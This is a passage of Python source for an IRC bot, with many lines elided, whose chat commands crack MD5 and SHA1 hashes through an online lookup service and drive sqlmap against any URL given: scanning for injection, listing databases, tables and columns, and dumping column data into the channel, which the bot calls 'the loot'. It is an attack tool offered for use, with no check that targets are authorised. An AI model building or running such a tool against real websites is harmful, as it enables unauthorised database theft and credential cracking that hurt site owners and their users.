	...
	def listen(self):
		while self.is_connected:
			...
			if str(recv).find ( "PRIVMSG" ) != -1:
				...
				print (( "(%s): %s: %s") % (irc_channel, irc_user_nick, irc_user_message)) # prints the message that was just said into our terminal
	...
	def process_command(self, user, channel):
		...
		#These commands take paramaters
			...
			if (command[0] == "md5"):
				try:
					md5hash = command[1]
					cracked_md5 = urllib.request.urlopen('https://www.insomnia247.nl/hash_api.php?type=md5&hash=' + md5hash).read()
			...
			if (command[0] == "sha1"):
				try:
					sha1hash = command[1]
					cracked_sha1 = urllib.request.urlopen('https://www.insomnia247.nl/hash_api.php?type=sha1&hash=' + sha1hash).read()
			...
			if (command[0] == "sqlmap"):
				if (len(command) != 3):
					self.send_message_to_channel( ("%sHelp:%s %sSyntax:%s %s!sqlmap vuln_url vuln_parameter" % (red,red,magenta,magenta,green)), channel)
					self.send_message_to_channel( ("%sExample:%s %s!sqlmap http://127.0.0.1/index.php?id=1 id" % (red,green,green)), channel)
				else:
					target = command[1]
					...
					self.send_message_to_channel( (("%s[+]%sUse !scan results %s%s %sfor the loot" ) % (red, green, cyan, scan_taskid, red)), channel )
			...
			if (command[0] == "scan") and (len(command) == 3):
				if (command[1] == "results"):
					...
					try:
						...
						self.send_message_to_channel( (("%sTry %s!gettables %shttp://targeturl.com %s%s" ) % (red, green, magenta, green, results["CurrentDB"])), channel )
					except:
			...
			if (command[0] == "gettables"):
				if (len(command) != 3):
					self.send_message_to_channel( ("%sSyntax: %s!gettables %shttp://targeturl.com %sdatabase_name" % (red, green, magenta, green)), channel)
				else:
					try:
						target = command[1]
						db = command[2]
						...
						self.send_message_to_channel( (("%s[+]%s Use !showtables %s%s %sfor list of tables" ) % (red, green, cyan, getTablesTaskid, red)), channel )
					except:
			...
			if (command[0] == "showtables"):
				if (len(command) != 2):
					self.send_message_to_channel( ("%sSyntax: %s!showtables %staskid_from_gettables" % (red, green, magenta)), channel)
				else:
					try:
						...
						self.send_message_to_channel( ("%sTry using %s!getcolumns %shttp://targeturl.com %s%s%s some_table_from_above") % (red, green, magenta, green, dbName, green), channel )
					except:
						self.send_message_to_channel( (("%sERROR" ) % (red)), channel )
			...
			if (command[0] == "getcolumns"):
				if (len(command) != 4):
					self.send_message_to_channel( ("%sSyntax: %s!getcolumns %shttp://targeturl.com %sdatabase_name %stable_name" % (red, green, magenta, green, magenta)), channel)
				else:
					try:						
						target = command[1]
						db = command[2]
						...
						self.send_message_to_channel( (("%s[+]%sUse !showcolumns %s%s %s%s %sfor columns list" ) % (red, green, cyan, getColumnsTaskid, red, table, cyan)), channel )
					except:
						self.send_message_to_channel( (("%sERROR" ) % (red)), channel )
			...
			if (command[0] == "showcolumns"):
				if (len(command) != 3):
					self.send_message_to_channel( ("%sSyntax: %s!showcolumns %staskid_from_showcolumns %stable_name" % (red, green, cyan, green)), channel)
				else:
					try:
						taskid = command[1]
						tableName = command[2]
						...
						self.send_message_to_channel( ("%sColumns in Table:%s %s%s") % (red, green, green, tableName), channel )
						self.send_message_to_channel( ("%s%s") % (green, columns), channel )
						self.send_message_to_channel( (("%s Try using%s !dump%s http://targeturl.com%s %s %s%s %sculumn_from_above") % (red, green, magenta, cyan, dbName, green, tableName, cyan)), channel)
					except:
						self.send_message_to_channel( (("%sERROR" ) % (red)), channel )
			...
			if(command[0] == "dump"):
				if (len(command) != 5):
					self.send_message_to_channel( (("%sSyntax:%s !dump%s http://targeturl.com%s dbName %stableName %sculumnName") % (red, green, magenta, green, red, cyan)), channel)
				else:
					try:
						target = command[1]
						db = command[2]
						...
						self.send_message_to_channel( (("%s[+]%sUse !getdump %s%s %s%s" ) % (red, green, cyan, taskid, red, column)), channel )
					except:
						self.send_message_to_channel( (("%sERROR" ) % (red)), channel )
			#usage !getdump target_url taskid column_name
			if (command[0] == "getdump"):
				if (len(command) != 3):
					self.send_message_to_channel( ("%sSyntax: %s!getdump %staskid %scolumn_name" % (red, green, cyan, red)), channel)
				else:
					try:
						taskid = command[1]
						column = command[2]
			...
			if (command[0] == "log"):
				if (len(command) != 2):
					...
					try:
						...
						level = info[1]
						message = info[2]
						self.send_message_to_channel( (("%s%s %s%s %s%s") % (yellow, the_time, red, level, green, message)) ,channel)
					except:
						self.send_message_to_channel ( (("%sSyntax: %s!log %staskid ") % (red, green, green, cyan)) ,channel)
